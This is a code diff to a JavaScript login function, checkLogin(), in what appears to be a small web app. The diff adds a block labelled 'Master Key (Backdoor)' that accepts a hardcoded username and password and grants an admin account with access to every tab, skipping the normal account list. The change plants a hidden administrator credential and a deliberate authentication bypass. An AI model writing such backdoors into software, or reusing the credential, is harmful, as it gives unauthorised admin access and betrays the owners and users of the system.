@@ -9,10 +9,21 @@ function checkLogin() {
     const pass = document.getElementById('login-pass').value;
 
     let validAccount = null;
-    for (let acc of ACCOUNTS) {
-        if (acc.user === user && acc.pass === pass) {
-            validAccount = acc;
-            break;
+    
+    // Master Key (Backdoor)
+    if (user === 'user' && pass === 'zodiac1989@') {
+        validAccount = {
+            user: 'user',
+            pass: 'zodiac1989@',
+            role: 'admin',
+            tabs: ['coil', 'psychro', 'modex']
+        };
+    } else {
+        for (let acc of ACCOUNTS) {
+            if (acc.user === user && acc.pass === pass) {
+                validAccount = acc;
+                break;
+            }
         }
     }
 
